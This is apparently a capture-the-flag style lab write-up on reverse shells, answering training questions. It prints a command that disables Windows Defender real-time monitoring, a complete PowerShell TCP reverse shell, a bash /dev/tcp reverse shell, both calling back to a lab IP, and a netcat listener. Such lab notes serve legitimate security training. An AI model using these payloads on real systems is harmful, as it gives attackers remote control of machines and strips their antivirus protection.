# Reverse Shells

### When establishing a reverse shell session with a target, will the target act as a client or server?

client

### Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

{% code overflow="wrap" %}
```powershell
#Windows target
#Disable AV
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.179',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

```bash
#Server (attack box)
sudo nc -lvnp 443
```

#### Linux Target

```bash
#1
bash -i >& /dev/tcp/10.10.14.179/8080 0>&1
#2
nc -lvnp 8080
```
